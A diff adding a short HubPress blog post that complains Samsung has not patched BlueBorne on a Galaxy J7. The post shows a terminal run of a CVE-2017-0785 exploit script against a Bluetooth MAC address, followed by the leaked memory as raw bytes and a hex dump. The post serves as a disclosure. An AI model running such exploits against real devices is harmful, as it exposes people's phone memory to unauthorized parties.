@@ -1,0 +1,24 @@
+// = Your Blog title
+// See https://hubpress.gitbooks.io/hubpress-knowledgebase/content/ for information about the parameters.
+// :hp-image: /covers/cover.png
+// :published_at: 2019-01-31
+// :hp-tags: HubPress, Blog, Open_Source,
+// :hp-alt-title: My English Title
+= "Happy" to see that Samsung doesn't give a shit about BlueBorne.
+
+:hp-tags: Samsung, J7, BlueBorne
+`
+─[$]› python CVE-2017-0785.py TARGET=28:27:BF:3A:17:8A
+
+[+] Exploit: Done
+
+\x03\x00\x00\x00+\x00\x00    \x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x04\x00\x00\x05\x00\x00\x06\x00\x00\x07\x00\x0\x00\x00    \x00    
+
+00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+*
+
+00000050  00 00 00 00  00 02 00 01  ea 3f 01 00  00 00 00 00  │····│····│·?··│····│
+
+00000060  00 00 75 30  00 00 00 08  f3 95 73 88  ce 93 12 b7  │··u0│····│··s·│····│
+...
+`
